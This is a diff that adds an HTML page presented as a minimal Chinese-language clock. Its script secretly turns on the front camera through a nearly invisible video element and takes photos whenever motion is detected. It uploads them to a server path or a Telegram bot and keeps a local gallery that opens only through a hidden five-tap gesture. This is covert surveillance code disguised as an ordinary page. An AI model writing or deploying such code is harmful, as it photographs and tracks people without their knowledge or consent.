@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>时钟</title>
+<style>
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{
+    background:#000;color:#ccc;
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+    height:100dvh;width:100vw;overflow:hidden;
+    display:flex;align-items:center;justify-content:center;
+    user-select:none;-webkit-user-select:none;
+    -webkit-tap-highlight-color:transparent;
+  }
+  #clock-container{text-align:center;z-index:1}
+  #time{font-size:18vw;font-weight:200;letter-spacing:.05em;color:#888;line-height:1}
+  #date{font-size:4vw;color:#555;margin-top:1.5vh;letter-spacing:.1em}
+  #status-dot{
+    position:fixed;top:16px;right:16px;
+    width:8px;height:8px;border-radius:50%;
+    background:#2a2;opacity:.5;transition:opacity .5s;z-index:10;
+  }
+  #status-dot.error{background:#a22;animation:pulse 1s infinite}
+  #status-dot.sending{background:#2af}
+  @keyframes pulse{0%,100%{opacity:.3}50%{opacity:.9}}
+
+  #video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:-1}
+  #canvas,#thumb-canvas{position:fixed;top:-9999px;left:-9999px;pointer-events:none}
+
+  /* ---- Admin ---- */
+  #admin{
+    display:none;position:fixed;inset:0;
+    background:rgba(0,0,0,.94);z-index:100;
+    flex-direction:column;align-items:center;
+    padding:48px 20px 20px;overflow-y:auto;
+  }
+  #admin.show{display:flex}
+  #admin h2{color:#666;font-weight:300;font-size:20px;margin-bottom:20px;letter-spacing:.15em}
+  #admin .close-btn{
+    position:fixed;top:16px;right:16px;
+    width:40px;height:40px;padding:0;border:none;
+    background:none;color:#666;font-size:26px;cursor:pointer;z-index:101;
+  }
+  #admin label{display:block;color:#888;font-size:12px;margin-bottom:4px;letter-spacing:.1em;width:100%;max-width:360px}
+  #admin input{
+    width:100%;max-width:360px;padding:10px 12px;margin-bottom:14px;
+    background:#1a1a1a;border:1px solid #333;border-radius:6px;
+    color:#ccc;font-size:14px;outline:none;
+  }
+  #admin input:focus{border-color:#555}
+  #admin .hint{font-size:11px;color:#555;margin:-10px 0 14px;width:100%;max-width:360px}
+  #admin button{
+    width:100%;max-width:360px;padding:12px;margin-bottom:8px;
+    background:#1a1a1a;border:1px solid #333;border-radius:6px;
+    color:#ccc;font-size:14px;cursor:pointer;letter-spacing:.1em;
+  }
+  #admin button:active{background:#333}
+  #admin button.primary{border-color:#5a5;color:#5a5}
+  #log-area{width:100%;max-width:360px;margin-top:8px;font-size:11px;color:#555;text-align:center;min-height:20px}
+
+  /* ---- Photo viewer in admin ---- */
+  #photo-gallery{width:100%;max-width:360px;margin-top:20px}
+  #photo-gallery h3{color:#555;font-weight:300;font-size:14px;margin-bottom:10px}
+  #photo-gallery .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
+  #photo-gallery .thumb{
+    aspect-ratio:4/3;background:#1a1a1a;
+    border:1px solid #2a2a2a;border-radius:4px;
+    object-fit:cover;width:100%;cursor:pointer;
+  }
+  #photo-gallery .thumb:hover{border-color:#555}
+  #photo-gallery .empty-photos{color:#444;font-size:13px;text-align:center;padding:20px}
+
+  /* Fullscreen preview */
+  #preview{
+    display:none;position:fixed;inset:0;background:#000;
+    z-index:200;align-items:center;justify-content:center;
+  }
+  #preview.show{display:flex}
+  #preview img{max-width:100vw;max-height:100vh}
+  #preview .close{
+    position:fixed;top:16px;right:16px;
+    width:40px;height:40px;background:none;border:none;
+    color:#666;font-size:28px;cursor:pointer;z-index:201;
+  }
+</style>
+</head>
+<body>
+
+<div id="clock-container">
+  <div id="time">00:00</div>
+  <div id="date">----年--月--日</div>
+</div>
+<div id="status-dot"></div>
+
+<video id="video" playsinline muted></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+<canvas id="thumb-canvas" width="64" height="48"></canvas>
+
+<div id="admin">
+  <button class="close-btn">&times;</button>
+  <h2>设置</h2>
+
+  <label>拍照间隔（秒）</label>
+  <input type="number" id="cfg-interval" value="5" min="2" max="60">
+
+  <label>动作灵敏度（越小越灵敏，建议 5~15）</label>
+  <input type="number" id="cfg-threshold" value="8" min="1" max="50">
+
+  <label>Telegram Bot Token</label>
+  <input type="text" id="cfg-tg-token" placeholder="1234567890:ABCdef...">
+
+  <label>Telegram Chat ID</label>
+  <input type="text" id="cfg-tg-chatid" placeholder="123456789">
+
+  <div class="hint">
+    ① Telegram 搜 <b>@BotFather</b> 创建 Bot，拿到 Token<br>
+    ② 搜 <b>@userinfobot</b> 获取你的 Chat ID<br>
+    ③ 填好后点「测试拍照」，Telegram 收到照片即成功
+  </div>
+
+  <button id="btn-test">测试拍照</button>
+  <button id="btn-save-cfg" class="primary">保存设置</button>
+  <button id="btn-clear-db">清空离线照片</button>
+  <div id="log-area"></div>
+
+  <div id="photo-gallery">
+    <h3>离线照片</h3>
+    <div class="grid" id="grid"></div>
+    <div class="empty-photos" id="empty-photos">暂无</div>
+  </div>
+</div>
+
+<div id="preview">
+  <button class="close">&times;</button>
+  <img id="preview-img" src="" alt="">
+</div>
+
+<script>
+(function(){
+var $=function(s){return document.querySelector(s)};
+var cfg={interval:5,threshold:8,tgToken:'',tgChatId:''};
+try{var s=JSON.parse(localStorage.getItem('ct_cfg'));if(s)Object.assign(cfg,s)}catch(_){}
+
+var stream=null,prevThumb=null,lastSend=0,captureTimer=null,wakeLock=null,db=null;
+
+function pad(n){return String(n).padStart(2,'0')}
+function updateClock(){
+  var d=new Date();
+  $('#time').textContent=pad(d.getHours())+':'+pad(d.getMinutes());
+  $('#date').textContent=d.getFullYear()+'年'+pad(d.getMonth()+1)+'月'+pad(d.getDate())+'日  '+'日一二三四五六'[d.getDay()];
+}
+
+function setStatus(s){
+  var d=$('#status-dot');d.className='';
+  if(s==='error')d.className='error';
+  else if(s==='sending')d.className='sending';
+}
+
+function log(m){$('#log-area').textContent=m;setTimeout(function(){$('#log-area').textContent=''},3000)}
+
+// ---- IndexedDB ----
+function openDB(){
+  return new Promise(function(resolve,reject){
+    var r=indexedDB.open('ct_db',1);
+    r.onupgradeneeded=function(){r.result.createObjectStore('photos',{keyPath:'id',autoIncrement:true})};
+    r.onsuccess=function(){db=r.result;resolve(db)};
+    r.onerror=function(){reject(r.error)};
+  });
+}
+
+async function saveToDB(data){
+  if(!db)await openDB();
+  return new Promise(function(resolve){
+    var txn=db.transaction('photos','readwrite');
+    var store=txn.objectStore('photos');
+    store.add({data:data,time:new Date().toISOString()});
+    // keep max 50
+    store.count().onsuccess=function(e){
+      if(e.target.result>50){
+        store.openCursor().onsuccess=function(ev){
+          var c=ev.target.result;if(c){c.delete();c.continue()}
+        };
+      }
+    };
+    txn.oncomplete=resolve;
+  });
+}
+
+async function getPhotos(){
+  if(!db)await openDB();
+  return new Promise(function(resolve){
+    var txn=db.transaction('photos','readonly');
+    var r=txn.objectStore('photos').getAll();
+    r.onsuccess=function(){resolve(r.result||[])}
+    r.onerror=function(){resolve([])}
+  });
+}
+
+async function clearDB(){
+  if(!db)await openDB();
+  return new Promise(function(resolve){
+    var txn=db.transaction('photos','readwrite');
+    txn.objectStore('photos').clear();
+    txn.oncomplete=resolve;
+  });
+}
+
+// ---- Send photo ----
+async function sendPhoto(imageData){
+  setStatus('sending');
+
+  // 1) Try server (if running)
+  try{
+    var r=await fetch('/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:imageData})});
+    if(r.ok){setStatus('');return true}
+  }catch(_){}
+
+  // 2) Telegram
+  if(cfg.tgToken&&cfg.tgChatId){
+    try{
+      var blob=await(await fetch(imageData)).blob();
+      var fd=new FormData();
+      fd.append('chat_id',cfg.tgChatId);
+      fd.append('photo',blob,'capture.jpg');
+      var r=await fetch('https://api.telegram.org/bot'+cfg.tgToken+'/sendPhoto',{method:'POST',body:fd});
+      if(r.ok){console.log('TG sent');setStatus('');return true}
+    }catch(_){}
+  }
+
+  // 3) IndexedDB fallback
+  try{await saveToDB(imageData);console.log('Saved to DB')}catch(_){}
+  setStatus('error');return false;
+}
+
+// ---- Camera ----
+function getThumbData(){
+  var v=$('#video'),c=$('#thumb-canvas'),ctx=c.getContext('2d');
+  ctx.drawImage(v,0,0,c.width,c.height);
+  return ctx.getImageData(0,0,c.width,c.height).data;
+}
+
+function pixelDiff(a,b){
+  if(!a||!b)return Infinity;
+  var diff=0,len=Math.min(a.length,b.length);
+  for(var i=0;i<len;i+=4)diff+=Math.abs(a[i]-b[i])+Math.abs(a[i+1]-b[i+1])+Math.abs(a[i+2]-b[i+2]);
+  return diff/(len/4);
+}
+
+function captureFrame(){
+  var v=$('#video'),c=$('#canvas');
+  if(v.readyState<2)return;
+  c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+  return c.toDataURL('image/jpeg',0.7);
+}
+
+async function doCapture(){
+  var now=Date.now();
+  if(now-lastSend<2000)return;
+  var thumb=getThumbData();
+  var diff=pixelDiff(thumb,prevThumb);
+  prevThumb=thumb;
+  if(diff<cfg.threshold)return;
+  var data=captureFrame();
+  if(!data)return;
+  lastSend=now;
+  await sendPhoto(data);
+}
+
+function startCaptureLoop(){
+  if(captureTimer)clearInterval(captureTimer);
+  captureTimer=setInterval(doCapture,cfg.interval*1000);
+}
+
+async function initCamera(){
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false
+    });
+    var v=$('#video');v.srcObject=stream;await v.play();
+    console.log('Camera ready');setStatus('');
+  }catch(e){console.error(e);setStatus('error')}
+}
+
+async function requestWakeLock(){
+  try{
+    if('wakeLock' in navigator){
+      wakeLock=await navigator.wakeLock.request('screen');
+      wakeLock.addEventListener('release',function(){setTimeout(requestWakeLock,1000)});
+    }
+  }catch(_){}
+}
+
+// ---- Admin ----
+var tapCount=0,tapTimer=null;
+$('#date').addEventListener('click',function(){
+  tapCount++;
+  if(tapTimer)clearTimeout(tapTimer);
+  tapTimer=setTimeout(function(){tapCount=0},2000);
+  if(tapCount>=5){tapCount=0;openAdmin()}
+});
+
+async function openAdmin(){
+  $('#cfg-interval').value=cfg.interval;
+  $('#cfg-threshold').value=cfg.threshold;
+  $('#cfg-tg-token').value=cfg.tgToken;
+  $('#cfg-tg-chatid').value=cfg.tgChatId;
+  $('#admin').classList.add('show');
+  refreshPhotoGallery();
+}
+
+function closeAdmin(){$('#admin').classList.remove('show')}
+
+async function refreshPhotoGallery(){
+  var photos=await getPhotos();
+  var grid=$('#grid'),empty=$('#empty-photos');
+  if(!photos.length){grid.innerHTML='';empty.style.display='block';return}
+  empty.style.display='none';
+  grid.innerHTML=photos.reverse().map(function(p,i){
+    return '<img class="thumb" src="'+p.data+'" data-idx="'+i+'" title="'+p.time+'">';
+  }).join('');
+  // tap to preview
+  grid.querySelectorAll('.thumb').forEach(function(img){
+    img.addEventListener('click',function(){
+      $('#preview-img').src=img.src;$('#preview').classList.add('show');
+    });
+  });
+}
+
+$('#admin .close-btn').addEventListener('click',closeAdmin);
+$('#preview .close').addEventListener('click',function(){$('#preview').classList.remove('show')});
+$('#preview').addEventListener('click',function(e){
+  if(e.target===$('#preview')||e.target.classList.contains('close'))
+    $('#preview').classList.remove('show');
+});
+
+$('#btn-test').addEventListener('click',async function(){
+  log('拍照中...');
+  var d=captureFrame();
+  if(!d){log('相机未就绪');return}
+  var ok=await sendPhoto(d);
+  log(ok?'已发送':'发送失败，已存离线');
+  refreshPhotoGallery();
+});
+
+$('#btn-save-cfg').addEventListener('click',function(){
+  cfg.interval=Math.max(2,parseInt($('#cfg-interval').value)||5);
+  cfg.threshold=Math.max(1,parseInt($('#cfg-threshold').value)||8);
+  cfg.tgToken=$('#cfg-tg-token').value.trim();
+  cfg.tgChatId=$('#cfg-tg-chatid').value.trim();
+  localStorage.setItem('ct_cfg',JSON.stringify(cfg));
+  startCaptureLoop();
+  log('已保存');
+  setTimeout(closeAdmin,800);
+});
+
+$('#btn-clear-db').addEventListener('click',async function(){
+  await clearDB();refreshPhotoGallery();log('离线照片已清空');
+});
+
+// ---- Init ----
+async function init(){
+  updateClock();
+  setInterval(updateClock,1000);
+  await openDB();
+  await initCamera();
+  startCaptureLoop();
+  requestWakeLock();
+
+  document.addEventListener('visibilitychange',function(){
+    if(document.visibilityState==='visible'){requestWakeLock();startCaptureLoop()}
+    else if(captureTimer){clearInterval(captureTimer);captureTimer=null}
+  });
+  setInterval(requestWakeLock,60000);
+}
+
+init().catch(function(e){console.error(e);setStatus('error')});
+})();
+</script>
+</body>
+</html>
